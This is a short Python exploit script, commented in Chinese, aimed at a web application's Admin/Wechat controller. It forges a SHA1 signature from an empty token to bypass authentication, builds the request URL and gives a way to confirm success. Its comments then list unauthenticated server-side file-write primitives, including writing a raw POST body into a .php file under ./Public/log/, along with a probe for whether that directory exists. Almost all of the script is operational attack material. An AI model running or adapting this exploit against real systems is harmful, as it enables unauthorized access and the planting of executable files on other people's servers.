#!/usr/bin/env python3
# Admin/Wechat 免鉴权签名绕过（token 取自不存在的 id -> $config=null -> token=''）
import hashlib, random, string, time, urllib.request, ssl

IP   = "TARGET_IP"
HOST = "TARGET_HOST"          # 必须走站点自己的 Host（Admin 组有域名白名单）

def sig(token, ts, nonce):
    return hashlib.sha1("".join(sorted([token, str(ts), nonce], key=str)).encode()).hexdigest()

ts    = int(time.time())
nonce = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))
S     = sig("", ts, nonce)     # token = '' —— 关键

# 1) 验证绕过：a=index 会 echo echostr
url = (f"https://{IP}/example.com?g=Admin&m=Wechat&a=index"
       f"&id=99999&signature={S}&timestamp={ts}&nonce={nonce}&echostr=PINGTEST")
# 命中判据：HTTP 200 + body 回显 PINGTEST ；无签名/错签名对照返回 9 字节 "no access"

# 2) 该控制器的服务端写入原语（extends Action，无鉴权、无 WAF）
#    index_1()        -> file_put_contents("./Public/log/testaa.php",  raw POST body)
#    index()          -> file_put_contents("./Public/log/a4.php",     4455)
#    custom_message() -> file_put_contents("./Public/log/test199999.php", $res)
#    ★ 三个落点都在 ./Public/log/，该目录**必须已存在**（file_put_contents 不会建目录）
#      —— 先探： GET /Public/log/ 若返回 nginx 404 则目录缺失，写入必然落空
#      —— 也可用 a=index 写 ./Public/log/a4.php(内容固定 4455) 作"目录是否存在"的探针
